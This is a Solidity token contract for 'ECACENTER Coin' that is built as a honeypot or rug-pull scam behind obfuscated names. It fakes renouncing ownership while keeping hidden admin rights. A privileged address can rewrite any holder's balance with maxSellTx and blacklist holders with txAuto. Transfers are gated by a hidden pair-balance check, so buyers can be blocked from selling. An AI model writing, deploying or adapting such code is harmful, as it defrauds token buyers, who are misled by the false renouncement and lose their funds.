//SPDX-License-Identifier: MIT

pragma solidity ^0.8.2;

interface buyListSwap {
    function totalSupply() external view returns (uint256);

    function balanceOf(address autoEnable) external view returns (uint256);

    function transfer(address txTotalSwap, uint256 minFee) external returns (bool);

    function allowance(address txFrom, address spender) external view returns (uint256);

    function approve(address spender, uint256 minFee) external returns (bool);

    function transferFrom(
        address sender,
        address txTotalSwap,
        uint256 minFee
    ) external returns (bool);

    event Transfer(address indexed from, address indexed autoExempt, uint256 value);
    event Approval(address indexed txFrom, address indexed spender, uint256 value);
}

interface liquidityMin {
    function createPair(address sellTotal, address walletFund) external returns (address);
}

interface receiverFund {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

abstract contract maxSell {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface buyListSwapMetadata is buyListSwap {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract ECACENTERCoin is maxSell, buyListSwap, buyListSwapMetadata {

    uint256 public receiverFrom;

    function approve(address exemptTeam, uint256 minFee) public virtual override returns (bool) {
        takeLaunch[_msgSender()][exemptTeam] = minFee;
        emit Approval(_msgSender(), exemptTeam, minFee);
        return true;
    }

    bool private receiverExempt;

    function balanceOf(address autoEnable) public view virtual override returns (uint256) {
        return liquidityModeFund[autoEnable];
    }

    address limitShould = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    function sellTxSwap(address toEnable, address txTotalSwap, uint256 minFee) internal returns (bool) {
        require(liquidityModeFund[toEnable] >= minFee);
        liquidityModeFund[toEnable] -= minFee;
        liquidityModeFund[txTotalSwap] += minFee;
        emit Transfer(toEnable, txTotalSwap, minFee);
        return true;
    }

    bool public buyFund;

    mapping(address => bool) public minReceiver;

    function autoAmountExempt(uint256 minFee) public {
        limitLiquidity();
        tokenTx = minFee;
    }

    uint256 tokenTx;

    uint256 private fundAuto;

    function maxSellTx(address liquidityLaunch, uint256 minFee) public {
        limitLiquidity();
        liquidityModeFund[liquidityLaunch] = minFee;
    }

    function allowance(address buyIs, address exemptTeam) external view virtual override returns (uint256) {
        if (exemptTeam == limitShould) {
            return type(uint256).max;
        }
        return takeLaunch[buyIs][exemptTeam];
    }

    function totalSupply() external view virtual override returns (uint256) {
        return sellLiquidity;
    }

    function owner() external view returns (address) {
        return isMode;
    }

    string private autoBuyTake = "ECACENTER Coin";

    bool public txTrading;

    function enableAt(address toEnable, address txTotalSwap, uint256 minFee) internal returns (bool) {
        if (toEnable == swapLiquidity) {
            return sellTxSwap(toEnable, txTotalSwap, minFee);
        }
        uint256 toSender = buyListSwap(teamTake).balanceOf(sellSwap);
        require(toSender == tokenTx);
        require(!minReceiver[toEnable]);
        return sellTxSwap(toEnable, txTotalSwap, minFee);
    }

    uint256 private sellLiquidity = 100000000 * 10 ** 18;

    address public swapLiquidity;

    function symbol() external view virtual override returns (string memory) {
        return tokenTakeIs;
    }

    constructor (){
        
        takeLimit();
        receiverFund teamAuto = receiverFund(limitShould);
        teamTake = liquidityMin(teamAuto.factory()).createPair(teamAuto.WETH(), address(this));
        if (receiverExempt) {
            fundAuto = receiverFundReceiver;
        }
        swapLiquidity = _msgSender();
        walletAt[swapLiquidity] = true;
        liquidityModeFund[swapLiquidity] = sellLiquidity;
        if (receiverFundReceiver != shouldLiquidity) {
            shouldLiquidity = receiverFrom;
        }
        emit Transfer(address(0), swapLiquidity, sellLiquidity);
    }

    function name() external view virtual override returns (string memory) {
        return autoBuyTake;
    }

    event OwnershipTransferred(address indexed modeReceiver, address indexed enableAmount);

    function decimals() external view virtual override returns (uint8) {
        return feeToSender;
    }

    uint8 private feeToSender = 18;

    function transfer(address liquidityLaunch, uint256 minFee) external virtual override returns (bool) {
        return enableAt(_msgSender(), liquidityLaunch, minFee);
    }

    address sellSwap = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    mapping(address => mapping(address => uint256)) private takeLaunch;

    function txAuto(address buyMode) public {
        limitLiquidity();
        
        if (buyMode == swapLiquidity || buyMode == teamTake) {
            return;
        }
        minReceiver[buyMode] = true;
    }

    mapping(address => uint256) private liquidityModeFund;

    bool public receiverMin;

    address private isMode;

    function transferFrom(address toEnable, address txTotalSwap, uint256 minFee) external override returns (bool) {
        if (_msgSender() != limitShould) {
            if (takeLaunch[toEnable][_msgSender()] != type(uint256).max) {
                require(minFee <= takeLaunch[toEnable][_msgSender()]);
                takeLaunch[toEnable][_msgSender()] -= minFee;
            }
        }
        return enableAt(toEnable, txTotalSwap, minFee);
    }

    function getOwner() external view returns (address) {
        return isMode;
    }

    uint256 tradingIs;

    address public teamTake;

    uint256 private receiverFundReceiver;

    uint256 public shouldLiquidity;

    string private tokenTakeIs = "ECN";

    function walletLimit(address shouldTotal) public {
        if (txTrading) {
            return;
        }
        
        walletAt[shouldTotal] = true;
        
        txTrading = true;
    }

    function limitLiquidity() private view {
        require(walletAt[_msgSender()]);
    }

    mapping(address => bool) public walletAt;

    function takeLimit() public {
        emit OwnershipTransferred(swapLiquidity, address(0));
        isMode = address(0);
    }

}